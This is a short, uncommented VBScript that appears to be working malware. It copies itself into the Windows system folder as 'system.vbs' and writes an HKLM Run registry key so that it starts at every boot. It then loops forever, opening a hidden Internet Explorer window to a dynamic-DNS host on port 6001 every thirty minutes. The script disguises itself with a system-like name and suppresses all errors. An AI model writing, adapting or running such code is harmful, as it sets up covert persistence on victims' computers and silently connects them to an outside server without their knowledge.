   On Error Resume Next
   Set fs=CreateObject("Scripting.FileSystemObject")
   Set dir2=fs.GetSpecialFolder(1)
   Set so=CreateObject("Scripting.FileSystemObject")
   Set r=CreateObject("Wscript.Shell")
   so.GetFile(WScript.ScriptFullName).Copy(dir2&"\system.vbs")
   r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\system","system.vbs"
   Set WshShell = WScript.CreateObject("WScript.Shell")
   do
   WshShell.Run "IEXPLORE.EXE http://java-china.vicp.net:6001/",0
   WScript.Sleep 1000*60*30
   loop
